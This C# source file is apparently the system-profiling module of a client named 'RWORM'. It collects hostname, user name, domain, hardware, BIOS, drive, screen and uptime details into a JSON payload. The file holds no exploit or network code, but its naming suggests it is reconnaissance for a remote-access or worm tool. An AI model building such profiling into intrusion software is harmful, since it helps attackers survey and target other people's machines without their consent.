using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using RWORM.Client.Core;

namespace RWORM.Client.Modules
{
    public static class SystemInfoDetailed
    {
        [StructLayout(LayoutKind.Sequential)]
        private struct SYSTEM_POWER_STATUS
        {
            public byte ACLineStatus;
            public byte BatteryFlag;
            public byte BatteryLifePercent;
            public byte SystemStatusFlag;
            public uint BatteryLifeTime;
            public uint BatteryFullLifeTime;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetSystemPowerStatus(out SYSTEM_POWER_STATUS lpSystemPowerStatus);

        [DllImport("kernel32.dll")]
        private static extern uint GetTickCount();

        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);

        private const int SM_CXSCREEN = 0;
        private const int SM_CYSCREEN = 1;

        public static byte[] GetDetailedInfo()
        {
            var sb = new StringBuilder("{");

            // 1. Basic Identity
            sb.Append($"\"hostname\":\"{JsonHelper.Escape(Environment.MachineName)}\",");
            sb.Append($"\"username\":\"{JsonHelper.Escape(Environment.UserName)}\",");
            sb.Append($"\"domain\":\"{JsonHelper.Escape(Environment.UserDomainName)}\",");
            sb.Append($"\"osVersion\":\"{JsonHelper.Escape(Environment.OSVersion.ToString())}\",");
            sb.Append($"\"is64BitOS\":{(Environment.Is64BitOperatingSystem ? "true" : "false")},");
            sb.Append($"\"is64BitProcess\":{(Environment.Is64BitProcess ? "true" : "false")},");
            sb.Append($"\"processorCount\":{Environment.ProcessorCount},");

            // 2. Battery & Power
            string powerType = "Desktop (No Battery)";
            int batteryPercent = -1;
            string chargingStatus = "Unknown";
            bool hasBattery = false;

            if (GetSystemPowerStatus(out SYSTEM_POWER_STATUS status))
            {
                if (status.BatteryFlag != 128 && status.BatteryFlag != 255)
                {
                    hasBattery = true;
                    powerType = "Laptop / Mobile Device";
                    batteryPercent = status.BatteryLifePercent <= 100 ? status.BatteryLifePercent : -1;
                }
                else
                {
                    powerType = "Desktop PC";
                }

                chargingStatus = status.ACLineStatus switch
                {
                    1 => "Online (Plugged In / AC)",
                    0 => "Offline (On Battery)",
                    _ => "Unknown"
                };
            }

            sb.Append($"\"deviceType\":\"{JsonHelper.Escape(powerType)}\",");
            sb.Append($"\"hasBattery\":{(hasBattery ? "true" : "false")},");
            sb.Append($"\"batteryPercent\":{batteryPercent},");
            sb.Append($"\"chargingStatus\":\"{JsonHelper.Escape(chargingStatus)}\",");

            // 3. Hardware (CPU, BIOS, Motherboard via Registry)
            string cpuName = "Unknown CPU";
            string cpuIdentifier = "";
            try
            {
                using var key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0");
                if (key != null)
                {
                    cpuName = key.GetValue("ProcessorNameString")?.ToString()?.Trim() ?? cpuName;
                    cpuIdentifier = key.GetValue("Identifier")?.ToString()?.Trim() ?? "";
                }
            }
            catch { }

            string biosVendor = "";
            string biosVersion = "";
            string biosDate = "";
            try
            {
                using var biosKey = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\BIOS");
                if (biosKey != null)
                {
                    biosVendor = biosKey.GetValue("BIOSVendor")?.ToString()?.Trim() ?? "";
                    biosVersion = biosKey.GetValue("BIOSVersion")?.ToString()?.Trim() ?? "";
                    biosDate = biosKey.GetValue("BIOSReleaseDate")?.ToString()?.Trim() ?? "";
                }
            }
            catch { }

            sb.Append($"\"cpuName\":\"{JsonHelper.Escape(cpuName)}\",");
            sb.Append($"\"cpuIdentifier\":\"{JsonHelper.Escape(cpuIdentifier)}\",");
            sb.Append($"\"biosVendor\":\"{JsonHelper.Escape(biosVendor)}\",");
            sb.Append($"\"biosVersion\":\"{JsonHelper.Escape(biosVersion)}\",");
            sb.Append($"\"biosDate\":\"{JsonHelper.Escape(biosDate)}\",");

            // 4. Memory & Drives
            long totalRamMb = GC.GetGCMemoryInfo().TotalAvailableMemoryBytes / (1024 * 1024);
            sb.Append($"\"totalRamMb\":{totalRamMb},");

            var drivesSb = new StringBuilder("[");
            bool firstDrive = true;
            try
            {
                foreach (var drive in DriveInfo.GetDrives())
                {
                    if (!drive.IsReady) continue;
                    if (!firstDrive) drivesSb.Append(',');
                    firstDrive = false;

                    string name = JsonHelper.Escape(drive.Name);
                    string label = JsonHelper.Escape(drive.VolumeLabel);
                    string format = JsonHelper.Escape(drive.DriveFormat);
                    long totalGb = drive.TotalSize / (1024 * 1024 * 1024);
                    long freeGb = drive.AvailableFreeSpace / (1024 * 1024 * 1024);

                    drivesSb.Append($"{{\"name\":\"{name}\",\"label\":\"{label}\",\"format\":\"{format}\",\"totalGb\":{totalGb},\"freeGb\":{freeGb}}}");
                }
            }
            catch { }
            drivesSb.Append(']');
            sb.Append($"\"drives\":{drivesSb},");

            // 5. Screen & Uptime
            int screenWidth = GetSystemMetrics(SM_CXSCREEN);
            int screenHeight = GetSystemMetrics(SM_CYSCREEN);
            TimeSpan uptime = TimeSpan.FromMilliseconds(GetTickCount());
            string uptimeStr = $"{(int)uptime.TotalDays}d {uptime.Hours}h {uptime.Minutes}m";

            sb.Append($"\"resolution\":\"{screenWidth}x{screenHeight}\",");
            sb.Append($"\"uptime\":\"{uptimeStr}\",");
            sb.Append($"\"systemDirectory\":\"{JsonHelper.Escape(Environment.SystemDirectory)}\",");
            sb.Append($"\"clientDirectory\":\"{JsonHelper.Escape(AppDomain.CurrentDomain.BaseDirectory)}\"");

            sb.Append('}');
            return Encoding.UTF8.GetBytes(sb.ToString());
        }
    }
}
